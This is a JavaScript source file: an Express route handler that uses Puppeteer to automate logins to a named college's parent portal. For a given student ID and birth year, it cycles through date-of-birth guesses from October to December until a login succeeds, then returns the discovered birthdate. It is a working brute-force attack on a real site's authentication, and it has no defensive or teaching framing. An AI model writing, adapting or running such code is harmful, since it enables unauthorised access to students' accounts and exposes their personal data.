const puppeteer = require('puppeteer');

const checker = async(req,res)=>{


  let dd = 9;
  let mm = 10;

  const username = req.body.usn;
  const year = req.body.yyy

// const {username,year} = req.body;

  while (mm <= 12) {
    const browser = await puppeteer.launch({ headless: false });
    const page = await browser.newPage();

    await page.goto('https://sims.sit.ac.in/parents/index.php', { waitUntil: 'domcontentloaded' });

    const before = page.url();

    await page.type('#username', username);
    if(dd<=9){
      await page.type('#dd', dd.toString().padStart(2, '0'));
    }else{
      await page.type('#dd', dd.toString());
    }
    if(mm<=9){
      await page.select('#mm', mm.toString().padStart(2, '0'));
    }else{
      await page.select('#mm', mm.toString());
    }
    
    await page.type('#yyyy', year);

    try {
        await page.click('.cn-login-btn',{waitUntil:'domcontentoaded'})
        await new Promise(resolve => setTimeout(resolve, 2000));
        const after = page.url();
        // console.log(after);
        // console.log(before);

        if (after === before) {
            console.log(`Login failed for ${dd}-${mm}.`);
            dd++;

        if (dd > 31) {
            dd = 1;
            mm++;
        }
        
        await browser.close();
        } else {
            // console.log('Login successful');
            // console.log(`${dd}-${mm}-2004`);
            await browser.close();
            return res.status(200).json({
                success:true,
                message:"login succesfull",
                data:`${dd}-${mm}-${year}`
            })
            break;
        }
    } catch (error) {
       
        return res.json({ success: false,
        message:failed });
        // console.log(error);
    }
  }

}
module.exports = checker